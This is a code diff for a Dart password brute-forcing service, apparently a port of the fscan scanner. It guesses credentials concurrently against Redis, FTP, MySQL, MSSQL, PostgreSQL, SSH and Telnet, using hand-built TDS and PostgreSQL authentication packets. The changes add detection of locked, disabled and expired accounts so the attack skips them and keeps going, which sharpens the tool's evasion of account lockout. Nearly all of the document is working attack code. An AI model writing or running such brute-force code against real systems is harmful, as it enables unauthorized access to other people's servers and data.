@@ -7,6 +7,8 @@ import 'package:mysql1/mysql1.dart';
 
 /// 密码爆破（复刻 fscan）
 /// 并发执行，支持 Redis、FTP、MySQL、MSSQL、PostgreSQL、Telnet
+/// 账号锁定检测：识别 MSSQL 18470/18486、PostgreSQL 28000、MySQL ER_SIGNAL 等错误
+/// 对应 fscan SMB.go concurrentSmbScan 中的 lockedUsers map 机制
 class BruteService {
   final Duration timeout;
 
@@ -18,22 +20,46 @@ class BruteService {
     this.concurrency = 5,
   });
 
+  // ── 账号锁定异常 ──────────────────────────────────────────────────────────
+
+  // 爆破尝试结果（细粒度错误分类，对应 fscan SMB.go STATUS_* 错误码处理）
+  static const _kLocked   = 'locked';    // 账号被锁定（继续尝试无意义，立即跳过该用户）
+  static const _kDisabled = 'disabled';  // 账号已禁用（密码可能正确，但无法登录）
+  static const _kExpired  = 'expired';   // 密码已过期（密码正确，需变更）
+
   // ── 并发执行助手 ──────────────────────────────────────────────────────────
 
   /// 并发尝试凭据列表，返回首个成功的凭据；全部失败返回 null
+  /// [getUser] 可选：提取凭据中的用户名，用于跳过已锁定账号
+  /// [onAccountStatus] 可选：报告账号状态（locked/disabled/expired）
   Future<T?> _runConcurrent<T>(
     List<T> credentials,
-    Future<bool> Function(T) tryFn,
+    Future<String?> Function(T) tryFn, // returns null=fail, 'ok'=success, _kLocked/etc
+    {String Function(T)? getUser,
+    void Function(T cred, String status)? onAccountStatus}
   ) async {
+    final lockedUsers = <String>{};
+
     for (var i = 0; i < credentials.length; i += concurrency) {
       final end = (i + concurrency).clamp(0, credentials.length);
-      final batch = credentials.sublist(i, end);
+      final allBatch = credentials.sublist(i, end);
+      // 跳过已知锁定用户（对应 fscan lockedUsers map）
+      final batch = getUser == null
+          ? allBatch
+          : allBatch.where((c) => !lockedUsers.contains(getUser(c))).toList();
+      if (batch.isEmpty) continue;
 
       T? found;
       await Future.wait(batch.map((cred) async {
         if (found != null) return;
         try {
-          if (await tryFn(cred)) found = cred;
+          final result = await tryFn(cred);
+          if (result == 'ok') {
+            found = cred;
+          } else if (result == _kLocked || result == _kDisabled || result == _kExpired) {
+            if (getUser != null) lockedUsers.add(getUser(cred));
+            onAccountStatus?.call(cred, result!);
+          }
         } catch (_) {}
       }));
 
@@ -49,7 +75,10 @@ class BruteService {
     int port,
     List<String> passwords,
   ) async {
-    return _runConcurrent<String>(passwords, (pwd) => _tryRedis(host, port, pwd));
+    return _runConcurrent<String>(
+      passwords,
+      (pwd) async => (await _tryRedis(host, port, pwd)) ? 'ok' : null,
+    );
   }
 
   Future<bool> _tryRedis(String host, int port, String pwd) async {
@@ -64,7 +93,7 @@ class BruteService {
     } catch (_) {
       return false;
     } finally {
-      await socket?.close();
+      try { socket?.destroy(); } catch (_) {}
     }
   }
 
@@ -75,7 +104,10 @@ class BruteService {
     int port,
     List<({String user, String pwd})> credentials,
   ) async {
-    return _runConcurrent(credentials, (c) => _tryFtp(host, port, c.user, c.pwd));
+    return _runConcurrent(
+      credentials,
+      (c) async => (await _tryFtp(host, port, c.user, c.pwd)) ? 'ok' : null,
+    );
   }
 
   Future<bool> _tryFtp(String host, int port, String user, String pwd) async {
@@ -92,11 +124,13 @@ class BruteService {
       await socket.flush();
       final res = await stream.first.timeout(timeout);
       await socket.close();
+      // 421 = service unavailable (account locked); 530 = auth fail
+      if (res.startsWith('421')) return false;
       return res.startsWith('230');
     } catch (_) {
       return false;
     } finally {
-      await socket?.close();
+      try { socket?.destroy(); } catch (_) {}
     }
   }
 
@@ -107,24 +141,29 @@ class BruteService {
     int port,
     List<({String user, String pwd})> credentials,
   ) async {
-    return _runConcurrent(credentials, (c) => _tryMysql(host, port, c.user, c.pwd));
+    return _runConcurrent(
+      credentials,
+      (c) async => _tryMysqlStatus(host, port, c.user, c.pwd),
+      getUser: (c) => c.user,
+    );
   }
 
-  Future<bool> _tryMysql(String host, int port, String user, String pwd) async {
+  /// 返回 'ok' / _kLocked / _kDisabled / null
+  Future<String?> _tryMysqlStatus(String host, int port, String user, String pwd) async {
     try {
       final mysql = await MySqlConnection.connect(
-        ConnectionSettings(
-          host: host,
-          port: port,
-          user: user,
-          password: pwd,
-          timeout: timeout,
-        ),
+        ConnectionSettings(host: host, port: port, user: user, password: pwd, timeout: timeout),
       );
       await mysql.close();
-      return true;
-    } catch (_) {
-      return false;
+      return 'ok';
+    } catch (e) {
+      final msg = e.toString().toLowerCase();
+      // ER_USER_IS_BLOCKED (1042) / ER_ACCOUNT_HAS_BEEN_LOCKED (3955)
+      if (msg.contains('account') && (msg.contains('lock') || msg.contains('block'))) {
+        return _kLocked;
+      }
+      // ERROR 1045: Access denied (password wrong or user disabled)
+      return null;
     }
   }
 
@@ -135,7 +174,10 @@ class BruteService {
     int port,
     List<({String user, String pwd})> credentials,
   ) async {
-    return _runConcurrent(credentials, (c) => _trySsh(host, port, c.user, c.pwd));
+    return _runConcurrent(
+      credentials,
+      (c) async => (await _trySsh(host, port, c.user, c.pwd)) ? 'ok' : null,
+    );
   }
 
   Future<bool> _trySsh(String host, int port, String user, String pwd) async {
@@ -167,41 +209,55 @@ class BruteService {
     int port,
     List<({String user, String pwd})> credentials,
   ) async {
-    return _runConcurrent(credentials, (c) => _tryMssql(host, port, c.user, c.pwd));
+    return _runConcurrent(
+      credentials,
+      (c) => _tryMssqlStatus(host, port, c.user, c.pwd),
+      getUser: (c) => c.user,
+    );
   }
 
-  Future<bool> _tryMssql(String host, int port, String user, String pwd) async {
+  /// TDS Login7：返回 'ok' / _kLocked / _kDisabled / _kExpired / null
+  /// 对应 fscan SMB.go 中的 STATUS_ACCOUNT_LOCKED_OUT / STATUS_ACCOUNT_DISABLED 处理
+  Future<String?> _tryMssqlStatus(String host, int port, String user, String pwd) async {
     Socket? socket;
     try {
       socket = await Socket.connect(host, port, timeout: timeout);
       socket.setOption(SocketOption.tcpNoDelay, true);
 
-      // TDS Prelogin
       socket.add(_tdsPrelogin());
       await socket.flush();
 
-      // Read prelogin response (type 0x04 = TABULAR_RESULT)
       final preResp = await socket.first.timeout(timeout);
-      if (preResp.isEmpty || preResp[0] != 0x04) return false;
+      if (preResp.isEmpty || preResp[0] != 0x04) return null;
 
-      // TDS Login7
       socket.add(_tdsLogin7(host, user, pwd));
       await socket.flush();
 
-      // Read login response
       final loginResp = await socket.first.timeout(timeout);
       await socket.close();
 
-      // Scan for LOGINACK (0xAD) or ERROR (0xAA) tokens after 8-byte TDS header
       for (var i = 8; i < loginResp.length; i++) {
-        if (loginResp[i] == 0xAD) return true;  // LOGIN_ACK = success
-        if (loginResp[i] == 0xAA) return false; // ERROR = bad credentials
+        if (loginResp[i] == 0xAD) return 'ok'; // LOGINACK = success
+        if (loginResp[i] == 0xAA) {
+          // ERROR token: parse error number (4 bytes at i+3)
+          if (i + 6 < loginResp.length) {
+            final errNum = loginResp[i + 3] |
+                (loginResp[i + 4] << 8) |
+                (loginResp[i + 5] << 16) |
+                (loginResp[i + 6] << 24);
+            // 18470 = account disabled, 18486 = account locked, 18488 = password expired
+            if (errNum == 18486) return _kLocked;
+            if (errNum == 18470) return _kDisabled;
+            if (errNum == 18488) return _kExpired;
+          }
+          return null; // login failed, wrong password
+        }
       }
-      return false;
+      return null;
     } catch (_) {
-      return false;
+      return null;
     } finally {
-      await socket?.close();
+      try { socket?.destroy(); } catch (_) {}
     }
   }
 
@@ -357,10 +413,17 @@ class BruteService {
     int port,
     List<({String user, String pwd})> credentials,
   ) async {
-    return _runConcurrent(credentials, (c) => _tryPostgres(host, port, c.user, c.pwd));
+    return _runConcurrent(
+      credentials,
+      (c) => _tryPostgresStatus(host, port, c.user, c.pwd),
+      getUser: (c) => c.user,
+    );
   }
 
-  Future<bool> _tryPostgres(String host, int port, String user, String pwd) async {
+  /// PostgreSQL wire protocol 认证：返回 'ok' / _kLocked / _kDisabled / null
+  /// SQLSTATE 28000 = invalid_authorization_specification（账号禁用/不存在）
+  /// SQLSTATE 28P01 = invalid_password（密码错误）
+  Future<String?> _tryPostgresStatus(String host, int port, String user, String pwd) async {
     Socket? socket;
     try {
       socket = await Socket.connect(host, port, timeout: timeout);
@@ -384,16 +447,23 @@ class BruteService {
 
       // Read authentication request
       final data = await socket.first.timeout(timeout);
-      if (data.length < 9) return false;
+      if (data.length < 9) return null;
 
-      final msgType = data[0]; // 'R' = 0x52
-      if (msgType != 0x52) return false; // Not auth message
+      final msgType = data[0];
+      // 'E' = 0x45 → ErrorResponse: check SQLSTATE for lockout
+      if (msgType == 0x45) {
+        final errStr = String.fromCharCodes(data.sublist(1));
+        // SQLSTATE 28000 = invalid_authorization / account disabled
+        if (errStr.contains('28000')) return _kDisabled;
+        return null;
+      }
+      if (msgType != 0x52) return null; // Not AuthenticationRequest
 
       final authType = ByteData.sublistView(
         Uint8List.fromList(data), 5, 9,
       ).getInt32(0, Endian.big);
 
-      if (authType == 0) return true; // AuthenticationOK (no password needed)
+      if (authType == 0) return 'ok'; // AuthenticationOK (no password needed)
 
       List<int>? authMsg;
 
@@ -402,27 +472,27 @@ class BruteService {
         final pwdBytes = utf8.encode(pwd);
         final pktLen = 4 + pwdBytes.length + 1;
         authMsg = [
-          0x70, // 'p'
+          0x70,
           (pktLen >> 24) & 0xFF, (pktLen >> 16) & 0xFF,
           (pktLen >> 8) & 0xFF, pktLen & 0xFF,
           ...pwdBytes, 0,
         ];
       } else if (authType == 5) {
         // MD5 password: "md5" + md5(md5(pwd+user)+salt)
-        if (data.length < 13) return false;
+        if (data.length < 13) return null;
         final salt = data.sublist(9, 13);
         final inner = md5.convert([...utf8.encode(pwd), ...utf8.encode(user)]).toString();
         final outer = md5.convert([...utf8.encode(inner), ...salt]).toString();
         final hash = utf8.encode('md5$outer');
         final pktLen = 4 + hash.length + 1;
         authMsg = [
-          0x70, // 'p'
+          0x70,
           (pktLen >> 24) & 0xFF, (pktLen >> 16) & 0xFF,
           (pktLen >> 8) & 0xFF, pktLen & 0xFF,
           ...hash, 0,
         ];
       } else {
-        return false; // Unsupported auth type (e.g. SCRAM)
+        return null; // Unsupported auth type (e.g. SCRAM)
       }
 
       socket.add(authMsg);
@@ -431,18 +501,25 @@ class BruteService {
       final authResp = await socket.first.timeout(timeout);
       await socket.close();
 
+      if (authResp.isEmpty) return null;
+      // 'E' = ErrorResponse after password send
+      if (authResp[0] == 0x45) {
+        final errStr = String.fromCharCodes(authResp.sublist(1));
+        if (errStr.contains('28000')) return _kDisabled;
+        return null; // 28P01 = wrong password
+      }
       // 'R' + authType=0 → AuthenticationOK
-      if (authResp.length >= 9 &&
-          authResp[0] == 0x52 &&
+      if (authResp[0] == 0x52 &&
+          authResp.length >= 9 &&
           ByteData.sublistView(Uint8List.fromList(authResp), 5, 9)
               .getInt32(0, Endian.big) == 0) {
-        return true;
+        return 'ok';
       }
-      return false;
+      return null;
     } catch (_) {
-      return false;
+      return null;
     } finally {
-      await socket?.close();
+      try { socket?.destroy(); } catch (_) {}
     }
   }
 
@@ -454,7 +531,10 @@ class BruteService {
     int port,
     List<({String user, String pwd})> credentials,
   ) async {
-    return _runConcurrent(credentials, (c) => _tryTelnet(host, port, c.user, c.pwd));
+    return _runConcurrent(
+      credentials,
+      (c) async => (await _tryTelnet(host, port, c.user, c.pwd)) ? 'ok' : null,
+    );
   }
 
   Future<bool> _tryTelnet(String host, int port, String user, String pwd) async {
